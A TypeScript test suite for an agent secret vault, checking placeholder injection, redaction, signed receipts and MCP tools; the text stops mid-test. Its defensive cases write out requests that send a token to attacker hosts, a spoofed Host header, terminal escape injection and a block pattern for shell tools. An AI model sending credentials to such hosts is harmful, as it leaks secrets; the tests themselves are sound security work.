/**
 * The agent vault: an agent uses a secret by placeholder and never holds it.
 * Every test runs offline; the "API" on the other end is a stand-in transport
 * that records exactly what reached it.
 *
 * All secret values here are made up for the tests. None is a real key.
 */
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { mkdtemp, readdir, readFile, rm, writeFile } from 'node:fs/promises';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { after, describe, it } from 'node:test';
import { ask } from '../src/agent.ts';
import { type ForwardTransport, forwardWithSecrets, type GateConfig, runWithSecrets, type Transport } from '../src/gate.ts';
import { readLedger, readReceipts, receiptsPath, signersOf, verifyLedger } from '../src/ledger.ts';
import { createMcpServer } from '../src/mcp-serve.ts';
import { toolsFor } from '../src/mcp.ts';
import { addSecret, findSecret, listSecrets, mcpToken, redactSecrets, removeSecret, revealSecret } from '../src/secrets.ts';
import type { SignedReceipt, SignedSecretUse } from '../src/types.ts';
import { addNote, createVault, type OpenVault, openVault, readNotes, signerFingerprint } from '../src/vault.ts';

process.env.NOAI_MODEL_DIR = join(tmpdir(), 'noai-no-model-here');

const PASS = 'a passphrase used only by the vault tests';
// Test values only. Shaped like the real thing so the redaction is tested on realistic input.
const GH = 'ghp_TESTONLY0a1b2c3d4e5f6g7h8i9j0k1l2m3n4';
const PLAY = 'ya29.TESTONLY-play-publisher-access-token-0001';
const STORE_PASS = 'test-keystore-pass-0001';
const JKS = Buffer.concat([Buffer.from([0xfe, 0xed, 0xfe, 0xed, 0, 0, 0, 2]), randomBytes(2400)]);

const dirs: string[] = [];
const closers: (() => void)[] = [];
after(async () => {
  for (const c of closers) c();
  for (const d of dirs) await rm(d, { recursive: true, force: true });
});

async function vault(): Promise<{ root: string; v: OpenVault }> {
  const root = await mkdtemp(join(tmpdir(), 'noai-vault-'));
  dirs.push(root);
  const v = await createVault(root, PASS);
  await addSecret(v, { name: 'github_token', value: Buffer.from(GH), hosts: ['api.github.com'] });
  await addSecret(v, { name: 'play_api_token', value: Buffer.from(PLAY), hosts: ['androidpublisher.googleapis.com'], placements: ['header', 'url'] });
  await addSecret(v, { name: 'upload_keystore', value: JKS, kind: 'file', fileName: 'upload-keystore.jks', hosts: ['signing.example.test'], placements: ['body'] });
  return { root, v };
}

interface Seen {
  url: string;
  method: string;
  headers: Record<string, string>;
  body?: string;
  redirect: string;
}

/** A stand-in API. It sees the real values, which is the point: only it should. */
function fakeApi(reply: (s: Seen) => { status?: number; headers?: [string, string][]; body?: string } = () => ({})): { transport: ForwardTransport; seen: Seen[] } {
  const seen: Seen[] = [];
  const transport: ForwardTransport = async (url, init) => {
    const s: Seen = { url, method: init.method, headers: init.headers, ...(init.body === undefined ? {} : { body: init.body }), redirect: init.redirect };
    seen.push(s);
    const r = reply(s);
    return { status: r.status ?? 200, headers: r.headers ?? [['content-type', 'application/json']], body: Buffer.from(r.body ?? '{"ok":true}'), truncated: false };
  };
  return { transport, seen };
}

/** Every file the vault writes, as text and as raw bytes, for "the value is not in here" checks. */
async function everything(root: string): Promise<{ text: string; bytes: Buffer }> {
  const files = await readdir(root);
  const bytes = Buffer.concat(await Promise.all(files.map((f) => readFile(join(root, f)))));
  return { text: bytes.toString('utf8'), bytes };
}

function assertNoSecret(haystack: string, ...values: string[]): void {
  for (const val of values) {
    for (const form of [val, Buffer.from(val).toString('base64'), Buffer.from(val).toString('hex')]) {
      assert.ok(!haystack.includes(form), `found a secret (or an encoding of it) where it must not be: ${form.slice(0, 12)}...`);
    }
  }
}

describe('V1 the secret store', () => {
  it('V1.1 seals name, hosts, file name and value; the file shows only that secrets exist', async () => {
    const { root } = await vault();
    const raw = await readFile(join(root, 'vault.json'), 'utf8');
    assertNoSecret(raw, GH, PLAY, 'github_token', 'api.github.com', 'upload-keystore.jks', 'androidpublisher');
    assert.ok(!raw.includes(JKS.toString('base64').slice(0, 40)));
  });

  it('V1.2 lists without values, and gives back a file byte for byte', async () => {
    const { v } = await vault();
    const all = listSecrets(v);
    assert.deepEqual(all.map((s) => s.name), ['github_token', 'play_api_token', 'upload_keystore']);
    assertNoSecret(JSON.stringify(all), GH, PLAY);
    assert.deepEqual(findSecret(v, 'github_token')?.placements, ['header']);
    const ks = findSecret(v, 'upload_keystore');
    assert.equal(ks?.kind, 'file');
    assert.equal(ks?.bytes, JKS.length);
    assert.ok(revealSecret(v, 'upload_keystore')?.equals(JKS));
  });

  it('V1.3 refuses a bad name, no host, a wildcard host, a too-short value, a multi-line text value, and a silent overwrite', async () => {
    const { v } = await vault();
    const add = (s: Partial<Parameters<typeof addSecret>[1]>) => addSecret(v, { name: 'x_token', value: Buffer.from('long enough value'), hosts: ['api.example.test'], ...s });
    await assert.rejects(add({ name: 'Bad Name' }), /not a usable secret name/);
    await assert.rejects(add({ hosts: [] }), /at least one host/);
    await assert.rejects(add({ hosts: ['*.example.test'] }), /bare host/);
    await assert.rejects(add({ hosts: ['https://api.example.test/v1'] }), /bare host/);
    await assert.rejects(add({ value: Buffer.from('abc') }), /at least 6 bytes/);
    await assert.rejects(add({ value: Buffer.from('two\nlines here') }), /Add it as a file/);
    await assert.rejects(add({ name: 'github_token' }), /already in the vault/);
    await add({ name: 'github_token', value: Buffer.from('ghp_TESTONLYreplacement00') }).catch(() => undefined);
    assert.equal(revealSecret(v, 'github_token')?.toString(), GH, 'a refused overwrite changed nothing');
  });

  it('V1.4 replaces deliberately and removes for real', async () => {
    const { root, v } = await vault();
    await addSecret(v, { name: 'github_token', value: Buffer.from('ghp_TESTONLYrotated000000'), hosts: ['api.github.com'] }, { replace: true });
    assert.equal(revealSecret(v, 'github_token')?.toString(), 'ghp_TESTONLYrotated000000');
    assert.equal(listSecrets(v).length, 3);
    assert.equal(await removeSecret(v, 'github_token'), true);
    assert.equal(await removeSecret(v, 'github_token'), false);
    assert.equal(findSecret(v, 'github_token'), null);
    const data = JSON.parse(await readFile(join(root, 'vault.json'), 'utf8')) as { secrets: Record<string, unknown> };
    assert.equal(Object.keys(data.secrets).length, 2);
  });
});

describe('V2 request-time injection', () => {
  it('V2.1 the API gets the real value; the agent, the receipts and the log only ever hold the placeholder', async () => {
    const { root, v } = await vault();
    const api = fakeApi(() => ({ body: '{"login":"silentkeytech"}' }));
    const r = await forwardWithSecrets(v, root, 'claude-code', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}', Accept: 'application/json' } }, { transport: api.transport });

    assert.equal(r.outcome, 'sent');
    assert.equal(api.seen.length, 1);
    assert.equal(api.seen[0]?.headers.Authorization, `Bearer ${GH}`);
    assert.equal(api.seen[0]?.redirect, 'manual', 'redirects are never followed with a secret attached');
    assert.match(r.handed, /^HTTP 200/);
    assert.match(r.handed, /silentkeytech/);
    assertNoSecret(r.handed, GH);

    const rc = r.receipt;
    assert.ok(rc);
    assert.equal(rc.kind, 'noai.secret-use');
    assert.equal(rc.client, 'claude-code');
    assert.equal(rc.host, 'api.github.com');
    assert.equal(rc.path, '/user');
    assert.equal(rc.method, 'GET');
    assert.deepEqual(rc.secrets.map((s) => [s.name, s.placements]), [['github_token', ['header']]]);
    assert.equal(rc.secrets[0]?.id, findSecret(v, 'github_token')?.id);
    assert.equal(rc.status, 200);

    const all = await everything(root);
    assertNoSecret(all.text, GH);
    assert.equal(verifyLedger(await readLedger(root), await readReceipts<SignedReceipt>(root)).valid, true);
  });

  it('V2.2 a file goes in base64, only where allowed, and never as raw text', async () => {
    const { root, v } = await vault();
    const api = fakeApi();
    const ok = await forwardWithSecrets(v, root, 'claude-code', { method: 'POST', url: 'https://signing.example.test/v1/keys', body: '{"keystore":"{{secret:upload_keystore:base64}}"}' }, { transport: api.transport });
    assert.equal(ok.outcome, 'sent');
    assert.equal(JSON.parse(api.seen[0]?.body ?? '{}').keystore, JKS.toString('base64'));
    const raw = await forwardWithSecrets(v, root, 'claude-code', { method: 'POST', url: 'https://signing.example.test/v1/keys', body: '{{secret:upload_keystore}}' }, { transport: api.transport });
    assert.equal(raw.outcome, 'refused');
    assert.match(raw.handed, /is a file/);
    assert.equal(api.seen.length, 1);
  });

  it('V2.3 a secret allowed in the URL is URL-encoded into the query', async () => {
    const { root, v } = await vault();
    const api = fakeApi();
    const r = await forwardWithSecrets(v, root, 'claude-code', { url: 'https://androidpublisher.googleapis.com/androidpublisher/v3/applications/com.example.test/edits?access_token={{secret:play_api_token}}' }, { transport: api.transport });
    assert.equal(r.outcome, 'sent');
    assert.equal(new URL(api.seen[0]?.url ?? '').searchParams.get('access_token'), PLAY);
    assert.equal(r.receipt?.path, '/androidpublisher/v3/applications/com.example.test/edits', 'the receipt keeps the path, not the query');
    assertNoSecret(JSON.stringify(r.receipt), PLAY);
  });

  it('V2.4 headers the transport owns are dropped, not passed through', async () => {
    const { root, v } = await vault();
    const api = fakeApi();
    await forwardWithSecrets(v, root, 'claude-code', { url: 'https://api.github.com/user', headers: { Host: 'evil.example.test', Authorization: 'Bearer {{secret:github_token}}' } }, { transport: api.transport });
    assert.equal(api.seen[0]?.headers.Host, undefined);
  });
});

describe('V3 policy: refused requests send nothing and are still receipted', () => {
  const cases: [string, Parameters<typeof forwardWithSecrets>[3], RegExp][] = [
    ['a host the owner did not allow', { url: 'https://attacker.example.test/collect', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, /may only be sent to api\.github\.com, not to attacker\.example\.test/],
    ['a look-alike host', { url: 'https://api.github.com.attacker.example.test/', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, /not to api\.github\.com\.attacker/],
    ['plain http', { url: 'http://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, /Only https/],
    ['a body when only headers are allowed', { method: 'POST', url: 'https://api.github.com/gists', body: '{"files":{"a.txt":{"content":"{{secret:github_token}}"}}}' }, /may not go in the request body/],
    ['the URL when only headers are allowed', { url: 'https://api.github.com/user?t={{secret:github_token}}' }, /may not go in the request url/],
    ['a secret that does not exist', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:aws_root_key}}' } }, /no secret named aws_root_key/],
    ['a placeholder in the host name', { url: 'https://{{secret:github_token}}.attacker.example.test/' }, /host name/],
    ['a user name in the URL', { url: 'https://user@api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, /user name or password/],
    ['a placeholder as a header name', { url: 'https://api.github.com/user', headers: { '{{secret:github_token}}': 'x' } }, /header name/],
    ['a GET with a body', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' }, body: 'x' }, /cannot have a body/],
    ['a method it does not send', { method: 'CONNECT', url: 'https://api.github.com/', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, /not a method/],
  ];
  for (const [what, req, why] of cases) {
    it(`V3 refuses ${what}`, async () => {
      const { root, v } = await vault();
      const api = fakeApi();
      const r = await forwardWithSecrets(v, root, 'claude-code', req, { transport: api.transport });
      assert.equal(r.outcome, 'refused');
      assert.match(r.handed, why);
      assert.match(r.handed, /Nothing was sent/);
      assert.equal(api.seen.length, 0, 'nothing reached any host');
      assert.equal(r.receipt?.outcome, 'refused');
      assert.equal(r.receipt?.status, null);
      assertNoSecret(r.handed + JSON.stringify(r.receipt), GH);
      assert.equal(verifyLedger(await readLedger(root), await readReceipts<SignedReceipt>(root)).valid, true);
    });
  }

  it('V3 a request that names no secret is not sent and not receipted: this is not a general web tool', async () => {
    const { root, v } = await vault();
    const api = fakeApi();
    const r = await forwardWithSecrets(v, root, 'claude-code', { url: 'https://api.github.com/zen' }, { transport: api.transport });
    assert.equal(r.outcome, 'refused');
    assert.equal(r.receipt, null);
    assert.equal(api.seen.length, 0);
    assert.equal((await readLedger(root)).length, 0);
  });
});

describe('V4 secrets are scrubbed from everything handed back', () => {
  it('V4.1 an API that echoes the secret, raw, base64, URL-encoded and in a header, echoes only placeholders', async () => {
    const { root, v } = await vault();
    const api = fakeApi(() => ({
      headers: [['content-type', 'application/json'], ['x-echo', GH], ['set-cookie', 'session=abc123def456']],
      body: JSON.stringify({ seen: `Bearer ${GH}`, b64: Buffer.from(GH).toString('base64'), url: encodeURIComponent(GH), other: PLAY }),
    }));
    const r = await forwardWithSecrets(v, root, 'claude-code', { url: 'https://api.github.com/echo', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, { transport: api.transport });
    assertNoSecret(r.handed, GH, PLAY);
    assert.match(r.handed, /x-echo: \{\{secret:github_token\}\}/);
    assert.match(r.handed, /\{\{secret:play_api_token\}\}/, 'a different vault secret in the response is blanked too');
    assert.ok(!r.handed.includes('set-cookie'), 'cookies minted from the secret are not handed over');
    assert.equal(r.receipt?.echoesRedacted, 5, 'header, raw, base64, URL form (the same as raw here) and the other secret');
  });

  it('V4.2 an error message that quotes the request is scrubbed before the agent or the receipt sees it', async () => {
    const { root, v } = await vault();
    const transport: ForwardTransport = async (url) => {
      throw new Error(`connect ECONNREFUSED while fetching ${url}`);
    };
    const r = await forwardWithSecrets(v, root, 'claude-code', { url: 'https://androidpublisher.googleapis.com/x?access_token={{secret:play_api_token}}' }, { transport });
    assert.equal(r.outcome, 'error');
    assertNoSecret(r.handed + JSON.stringify(r.receipt), PLAY);
    assert.equal(r.receipt?.outcome, 'error');
  });

  it('V4.3 a secret pasted into a note never reaches the model', async () => {
    const { root, v } = await vault();
    // A password has no telltale shape, so the pattern redactor alone would let it through.
    await addSecret(v, { name: 'keystore_password', value: Buffer.from(STORE_PASS), hosts: ['signing.example.test'] });
    await addNote(v, 'Dev: GitHub', `My GitHub token is ${GH} for the noai repo, keystore password ${STORE_PASS}.`);
    const sent: string[] = [];
    const transport: Transport = async (_u, init) => {
      sent.push(init.body);
      return { ok: true, status: 200, text: async () => JSON.stringify({ choices: [{ message: { content: 'It is in your vault [P1].' }, finish_reason: 'stop' }], usage: null }) };
    };
    const cfg: GateConfig = { root, baseUrl: 'https://api.tokenfactory.nebius.com/v1', apiKey: 'test', model: 'nvidia/nemotron-3-super-120b-a12b', maxPayloadBytes: 8000, maxTokens: 512 };
    await ask(v, cfg, 'what is my github token for the noai repo', 3, transport, null);
    assert.equal(sent.length, 1);
    assert.match(sent[0] as string, /noai repo/, 'the note itself was sent');
    assertNoSecret(sent[0] as string, GH, STORE_PASS);
  });

  it('V4.4 redactSecrets catches hex and unpadded base64 too, and leaves other text alone', () => {
    const s = [{ name: 'k', value: Buffer.from('TESTONLY-value-42') }];
    const input = `a ${Buffer.from('TESTONLY-value-42').toString('hex')} b ${Buffer.from('TESTONLY-value-42').toString('base64').replace(/=+$/, '')} c`;
    const r = redactSecrets(input, s);
    assert.equal(r.text, 'a {{secret:k}} b {{secret:k}} c');
    assert.equal(redactSecrets('nothing here', s).text, 'nothing here');
  });
});

describe('V5 receipts verify offline, and tampering shows', () => {
  async function busy() {
    const { root, v } = await vault();
    const api = fakeApi();
    await forwardWithSecrets(v, root, 'claude-code', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, { transport: api.transport });
    await forwardWithSecrets(v, root, 'claude-code', { url: 'https://attacker.example.test/', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, { transport: api.transport });
    await forwardWithSecrets(v, root, 'cursor', { url: 'https://androidpublisher.googleapis.com/x', headers: { Authorization: 'Bearer {{secret:play_api_token}}' } }, { transport: api.transport });
    return { root, v };
  }

  it('V5.1 a mixed chain of uses and refusals verifies from the two files alone, signed by the device key', async () => {
    const { root, v } = await busy();
    const receipts = await readReceipts<SignedReceipt>(root);
    const verdict = verifyLedger(await readLedger(root), receipts);
    assert.equal(verdict.valid, true, verdict.reason);
    assert.equal(verdict.length, 3);
    assert.deepEqual(signersOf(receipts), [signerFingerprint(v.data.device.publicKey)]);
    const entries = await readLedger(root);
    assert.deepEqual(entries.map((e) => e.model), ['vault:claude-code', 'vault:claude-code', 'vault:cursor']);
  });

  it('V5.2 hiding a refusal by editing a receipt breaks the chain at that entry', async () => {
    const { root } = await busy();
    const lines = (await readFile(receiptsPath(root), 'utf8')).trim().split('\n');
    const r = JSON.parse(lines[1] as string) as SignedSecretUse;
    r.receipt.host = 'api.github.com';
    r.receipt.outcome = 'sent';
    lines[1] = JSON.stringify(r);
    await writeFile(receiptsPath(root), `${lines.join('\n')}\n`);
    const verdict = verifyLedger(await readLedger(root), await readReceipts<SignedReceipt>(root));
    assert.equal(verdict.valid, false);
    assert.equal(verdict.brokenAt, 1);
  });

  it('V5.3 deleting a use breaks the chain', async () => {
    const { root } = await busy();
    const lines = (await readFile(receiptsPath(root), 'utf8')).trim().split('\n');
    await writeFile(receiptsPath(root), `${[lines[0], lines[2]].join('\n')}\n`);
    assert.equal(verifyLedger(await readLedger(root), await readReceipts<SignedReceipt>(root)).valid, false);
  });

  it('V5.4 a chain rewritten under another key may hang together, but names a stranger as signer', async () => {
    const { root, v } = await busy();
    const other = await vault();
    const api = fakeApi();
    await forwardWithSecrets(other.v, other.root, 'claude-code', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, { transport: api.transport });
    const forged = await readReceipts<SignedReceipt>(other.root);
    assert.equal(verifyLedger(await readLedger(other.root), forged).valid, true);
    assert.notDeepEqual(signersOf(forged), signersOf(await readReceipts<SignedReceipt>(root)));
    assert.ok(!signersOf(forged).includes(signerFingerprint(v.data.device.publicKey)));
  });
});

describe('V6 the agent vault over MCP', () => {
  async function serve() {
    const { root, v } = await vault();
    const api = fakeApi((s) => ({ body: JSON.stringify({ authorization: s.headers.Authorization }) }));
    const token = await mcpToken(v);
    const cfg: GateConfig = { root, baseUrl: 'https://api.tokenfactory.nebius.com/v1', apiKey: 'test', model: 'm', maxPayloadBytes: 8000, maxTokens: 512 };
    const server = createMcpServer({ ctx: { vault: v, cfg, reveal: [], toolset: 'vault', forward: { transport: api.transport } }, token, allowedOrigins: [] });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    closers.push(() => server.close());
    const url = `http://127.0.0.1:${String((server.address() as AddressInfo).port)}/mcp`;
    let session = '';
    let id = 1;
    const rpc = async (method: string, params: Record<string, unknown> = {}) => {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json', authorization: `Bearer ${token}`, ...(session ? { 'mcp-session-id': session } : {}) },
        body: JSON.stringify({ jsonrpc: '2.0', id: id++, method, params }),
      });
      session ||= res.headers.get('mcp-session-id') ?? '';
      return (await res.json()) as { result: any };
    };
    await rpc('initialize', { protocolVersion: '2025-11-25', capabilities: {}, clientInfo: { name: 'claude-code', version: '2.0' } });
    return { root, v, api, rpc, token };
  }

  it('V6.1 offers only the vault tools, and tells the agent never to ask for a secret', async () => {
    const { rpc } = await serve();
    const list = await rpc('tools/list');
    assert.deepEqual(list.result.tools.map((t: { name: string }) => t.name), ['list_secrets', 'http_request', 'verify_disclosures']);
  });

  it('V6.2 list_secrets names placeholders and policy, never a value', async () => {
    const { rpc } = await serve();
    const r = await rpc('tools/call', { name: 'list_secrets', arguments: {} });
    const out = JSON.stringify(r.result);
    assert.match(out, /\{\{secret:github_token\}\}/);
    assert.match(out, /\{\{secret:upload_keystore:base64\}\}/);
    assertNoSecret(out, GH, PLAY);
    assert.ok(!out.includes(JKS.toString('base64').slice(0, 40)));
  });

  it('V6.3 http_request end to end: the API sees the value, the agent sees the placeholder, the receipt names the client', async () => {
    const { root, api, rpc } = await serve();
    const r = await rpc('tools/call', { name: 'http_request', arguments: { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' } } });
    assert.equal(api.seen[0]?.headers.Authorization, `Bearer ${GH}`);
    assert.equal(r.result.isError, false);
    assert.match(r.result.content[0].text, /Bearer \{\{secret:github_token\}\}/, 'the echoed header came back as its placeholder');
    assertNoSecret(JSON.stringify(r.result), GH);
    const receipts = (await readReceipts<SignedReceipt>(root)).filter((x): x is SignedSecretUse => x.receipt.kind === 'noai.secret-use');
    assert.equal(receipts.length, 1);
    assert.equal(receipts[0]?.receipt.client, 'claude-code');
    assertNoSecret((await everything(root)).text, GH);
  });

  it('V6.4 a refused request is an error the agent can read, and verify_disclosures counts it', async () => {
    const { rpc } = await serve();
    const r = await rpc('tools/call', { name: 'http_request', arguments: { url: 'https://attacker.example.test/', headers: { 'X-Key': '{{secret:github_token}}' } } });
    assert.equal(r.result.isError, true);
    assert.match(r.result.content[0].text, /not to attacker\.example\.test/);
    const v = await rpc('tools/call', { name: 'verify_disclosures', arguments: {} });
    assert.equal(v.result.structuredContent.valid, true);
    assert.equal(v.result.structuredContent.length, 1);
  });

  it('V6.5 the notes tools are not reachable from the vault toolset', async () => {
    const { rpc } = await serve();
    const r = await rpc('tools/call', { name: 'ask_noai', arguments: { question: 'anything' } });
    assert.match(JSON.stringify(r), /Unknown tool/);
  });

  it('V6.6 the MCP token is sealed in the vault and stays the same across restarts', async () => {
    const { root, v, token } = await serve();
    assert.equal(await mcpToken(v), token);
    assert.ok(!(await readFile(join(root, 'vault.json'), 'utf8')).includes(token));
    assert.notEqual(await mcpToken(v, { rotate: true }), token);
  });
});

describe('V7 structure', () => {
  it('only gate.ts unseals a secret for sending; the owner CLI may unseal one to export it', () => {
    const src = new URL('../src/', import.meta.url);
    const callers = readdirSync(src)
      .filter((f) => f.endsWith('.ts') && f !== 'secrets.ts')
      .filter((f) => /\brevealSecret\s*\(/.test(readFileSync(new URL(f, src), 'utf8')));
    assert.deepEqual(callers.sort(), ['gate.ts', 'vault-cli.ts']);
  });

  it('nothing in the vault code logs a value', () => {
    for (const f of ['secrets.ts', 'gate.ts', 'mcp.ts']) {
      const code = readFileSync(new URL(`../src/${f}`, import.meta.url), 'utf8');
      assert.ok(!/console\.(log|error|warn|info|debug)/.test(code), `${f} writes to the console`);
    }
  });
});

describe('V8 local tools: the owner hands a key to one program for one run', () => {
  const NODE = process.execPath;
  async function run(v: OpenVault, root: string, args: string[], env: Record<string, string> = {}, files: Record<string, string> = {}) {
    const seen: string[] = [];
    const r = await runWithSecrets(v, root, { command: NODE, args, env, files }, { out: (t) => seen.push(t), err: (t) => seen.push(t) });
    return { ...r, output: seen.join('') };
  }

  it('V8.1 the program gets the password in its environment; its own output shows only the placeholder', async () => {
    const { root, v } = await vault();
    await addSecret(v, { name: 'keystore_password', value: Buffer.from(STORE_PASS), hosts: ['signing.example.test'] });
    const r = await run(v, root, ['-e', `console.log('pw', process.env.STORE_PASSWORD); process.exit(process.env.STORE_PASSWORD === '${STORE_PASS}' ? 7 : 3)`], { STORE_PASSWORD: 'keystore_password' });
    assert.equal(r.outcome, 'sent');
    assert.equal(r.code, 7, 'the program received the real value');
    assert.match(r.output, /pw \{\{secret:keystore_password\}\}/);
    assertNoSecret(r.output, STORE_PASS);
    assert.equal(r.receipt.method, 'RUN');
    assert.equal(r.receipt.host, 'local');
    assert.equal(r.receipt.status, 7);
    assert.equal(r.receipt.echoesRedacted, 1);
    assert.deepEqual(r.receipt.secrets.map((s) => [s.name, s.placements]), [['keystore_password', ['env']]]);
  });

  it('V8.2 a keystore file exists only while the program runs, byte for byte, and %VAR% gives tools its path', async () => {
    const { root, v } = await vault();
    const check = `const fs=require('fs');const p=process.argv[1];console.log('at',p);process.exit(p===process.env.KS&&fs.readFileSync(p).toString('base64')==='${JKS.toString('base64')}'?7:3)`;
    const r = await run(v, root, ['-e', check, '%KS%'], {}, { KS: 'upload_keystore' });
    assert.equal(r.code, 7, 'the program read the exact keystore at the path it was given');
    assert.ok(r.tempDir);
    assert.equal(existsSync(r.tempDir as string), false, 'the temporary folder is gone after the run');
    assert.deepEqual(r.receipt.secrets.map((s) => [s.name, s.placements]), [['upload_keystore', ['file']]]);
  });

  it('V8.3 refuses an unknown secret, a file as an environment value, a bad variable name and a run with no secret, and receipts each', async () => {
    const { root, v } = await vault();
    for (const [env, files, why] of [
      [{ P: 'nope' }, {}, /no secret named nope/],
      [{ P: 'upload_keystore' }, {}, /is a file/],
      [{ 'BAD-NAME': 'github_token' }, {}, /not a usable environment variable/],
      [{}, {}, /names no vault secret/],
      [{ X: 'github_token' }, { X: 'upload_keystore' }, /both a value and a file/],
    ] as [Record<string, string>, Record<string, string>, RegExp][]) {
      const r = await run(v, root, ['-e', 'process.exit(0)'], env, files);
      assert.equal(r.outcome, 'refused');
      assert.match(r.reason ?? '', why);
      assert.equal(r.receipt.outcome, 'refused');
    }
    assert.equal(verifyLedger(await readLedger(root), await readReceipts<SignedReceipt>(root)).valid, true);
  });

  it('V8.4 a program that cannot start still wipes the files and leaves an error receipt', async () => {
    const { root, v } = await vault();
    const r = await runWithSecrets(v, root, { command: join(root, 'no-such-tool.exe'), args: [], files: { KS: 'upload_keystore' } }, { out: () => undefined, err: () => undefined });
    assert.equal(r.outcome, 'error');
    assert.equal(existsSync(r.tempDir as string), false);
    assert.equal(r.receipt.outcome, 'error');
  });

  it('V8.5 no value or encoding of one lands in the receipts, the ledger or the vault file', async () => {
    const { root, v } = await vault();
    await run(v, root, ['-e', `console.log(process.env.T, Buffer.from(process.env.T).toString('base64'))`], { T: 'github_token' });
    assertNoSecret((await everything(root)).text, GH);
  });

  it('V8.6 running a local program is never offered to an agent, and only gate.ts may start one', () => {
    for (const set of ['notes', 'vault', 'all'] as const) {
      assert.ok(!toolsFor(set).some((t) => /run|exec|shell|command/i.test(t.name)), `${set} offers a way to run a program`);
    }
    const src = new URL('../src/', import.meta.url);
    const spawners = readdirSync(src)
      .filter((f) => f.endsWith('.ts'))
      .filter((f) => /node:child_process|\bchild_process\b/.test(readFileSync(new URL(f, src), 'utf8')));
    assert.deepEqual(spawners, ['gate.ts']);
  });
});

describe('V9 regressions from the 3 Oct internal security review', () => {
  it('V9.1 a response cut inside an echoed secret does not hand over the start of it', async () => {
    const { root, v } = await vault();
    const transport: ForwardTransport = async () => ({ status: 200, headers: [], body: Buffer.from(`{"echo":"Bearer ${GH.slice(0, -1)}`), truncated: true });
    const r = await forwardWithSecrets(v, root, 'claude-code', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, { transport });
    assert.ok(!r.handed.includes(GH.slice(0, 12)), 'the cut-off start of the secret reached the agent');
    assert.match(r.handed, /Bearer \{\{secret:github_token\}\}/);
    assert.equal(r.receipt?.echoesRedacted, 1);
  });

  it('V9.2 a program run with a key never sees the vault passphrase, NOAI settings, or a variable already holding a secret', async () => {
    const { root, v } = await vault();
    const saved = { p: process.env.NOAI_PASSPHRASE, t: process.env.NOAI_MCP_TOKEN, x: process.env.SOME_OLD_TOKEN };
    process.env.NOAI_PASSPHRASE = PASS;
    process.env.NOAI_MCP_TOKEN = 'noai_test_token_value_000000000';
    process.env.SOME_OLD_TOKEN = `prefix ${PLAY}`;
    try {
      const seen: string[] = [];
      const r = await runWithSecrets(
        v,
        root,
        { command: process.execPath, args: ['-e', 'const e=process.env; process.exit((e.NOAI_PASSPHRASE||e.NOAI_MCP_TOKEN||e.SOME_OLD_TOKEN) ? 3 : (e.T ? 7 : 4))'], env: { T: 'github_token' } },
        { out: (t) => seen.push(t), err: (t) => seen.push(t) },
      );
      assert.equal(r.code, 7, seen.join(''));
    } finally {
      for (const [k, val] of [['NOAI_PASSPHRASE', saved.p], ['NOAI_MCP_TOKEN', saved.t], ['SOME_OLD_TOKEN', saved.x]] as const) {
        if (val === undefined) delete process.env[k];
        else process.env[k] = val;
      }
    }
  });

  it('V9.3 a secret removed in another window stops working in a server that is already running, and is not written back', async () => {
    const { root, v: server } = await vault();
    const owner = await openVault(root, PASS);
    assert.equal(await removeSecret(owner, 'github_token'), true);
    const api = fakeApi();
    const r = await forwardWithSecrets(server, root, 'claude-code', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:github_token}}' } }, { transport: api.transport });
    assert.equal(r.outcome, 'refused');
    assert.equal(api.seen.length, 0);
    // The server writing something else (a note) must not resurrect it.
    await addNote(server, 'Later', 'A note written by the running server.');
    const fresh = await openVault(root, PASS);
    assert.equal(findSecret(fresh, 'github_token'), null);
    assert.equal(readNotes(fresh).length, 1);
    // And one added in another window works at once.
    await addSecret(owner, { name: 'new_token', value: Buffer.from('TESTONLY-new-token-value'), hosts: ['api.github.com'] });
    const n = await forwardWithSecrets(server, root, 'claude-code', { url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret:new_token}}' } }, { transport: api.transport });
    assert.equal(n.outcome, 'sent');
  });

  it('V9.4 an agent cannot plant terminal control characters in a receipt', async () => {
    const { root, v } = await vault();
    const ESC = String.fromCharCode(27);
    const r = await forwardWithSecrets(v, root, 'claude-code', { method: `X${ESC}[2KFAKE`, url: `https://api.github.com/a${ESC}[2Kb`, headers: { Authorization: 'Bearer {{secret:github_token}}' } }, { transport: fakeApi().transport });
    assert.equal(r.outcome, 'refused');
    const stored = await readFile(receiptsPath(root), 'utf8');
    assert.ok(!stored.includes(ESC) && !stored.includes('\\u001b'), 'a control character reached the receipt file');
    assert.equal(r.receipt?.method, 'INVALID');
  });

  it('V9.5 JSON-escaped and lower-case percent-encoded echoes are blanked too', () => {
    const s = [{ name: 'k', value: Buffer.from('TESTONLY/abc+def=') }];
    const json = JSON.stringify({ a: 'TESTONLY/abc+def=' }).replace('/', '\\/');
    assert.ok(!redactSecrets(json, s).text.includes('abc+def'));
    assert.ok(!redactSecrets('q=TESTONLY%2fabc%2bdef%3d', s).text.includes('abc'));
  });

  it('V9.6 through cmd.exe, a text secret named as %VAR% in the arguments is refused', { skip: process.platform !== 'win32' }, async () => {
    const { root, v } = await vault();
    const bat = join(root, 'tool.cmd');
    await writeFile(bat, '@echo off\r\necho %1\r\n');
    const seen: string[] = [];
    const r = await runWithSecrets(v, root, { command: bat, args: ['%T%'], env: { T: 'github_token' } }, { out: (t) => seen.push(t), err: (t) => seen.push(t) });
